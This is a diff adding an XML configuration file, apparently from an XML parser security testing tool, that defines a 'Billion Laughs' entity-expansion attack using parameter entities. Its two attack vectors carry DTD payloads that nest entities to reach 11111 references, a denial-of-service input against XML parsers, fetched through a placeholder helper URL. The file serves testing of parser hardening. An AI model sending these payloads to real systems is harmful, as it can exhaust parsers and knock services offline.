@@ -1,0 +1,37 @@
+<config>
+<name>Billion Laughs Attack with Parameter Entities</name>
+<description>This file expands to about 30 KByte but has a total of 11111 entity references and therefore exceeds a reasonable threshold of entity references.</description>
+<params>
+    <dosbox>true</dosbox>
+    <targetFile>false</targetFile>
+    <helperURL>true</helperURL>
+    <attackListenerURL>false</attackListenerURL>
+    <externalResources>true</externalResources>
+</params>
+<attackvectors>
+<attackvector type="system" default="true">
+<directMessage><![CDATA[<!DOCTYPE data SYSTEM "§tf_helperURL§" [
+<!ELEMENT data (#PCDATA)>
+]>
+<data>&g;</data>]]></directMessage>
+<helperMessage><![CDATA[ <!ENTITY % a0 "dos" >
+<!ENTITY % a1 "%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;">
+<!ENTITY % a2 "%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;">
+<!ENTITY % a3 "%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;">
+<!ENTITY % a4 "%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;">
+<!ENTITY g  "%a4;">]]></helperMessage>
+</attackvector>
+<attackvector type="public">
+<directMessage><![CDATA[<!DOCTYPE data PUBLIC p "§tf_helperURL§" [
+<!ELEMENT data (#PCDATA)>
+]>
+<data>&g;</data>]]></directMessage>
+<helperMessage><![CDATA[ <!ENTITY % a0 "dos" >
+<!ENTITY % a1 "%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;">
+<!ENTITY % a2 "%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;">
+<!ENTITY % a3 "%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;">
+<!ENTITY % a4 "%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;">
+<!ENTITY g  "%a4;">]]></helperMessage>
+</attackvector>
+</attackvectors>
+</config>
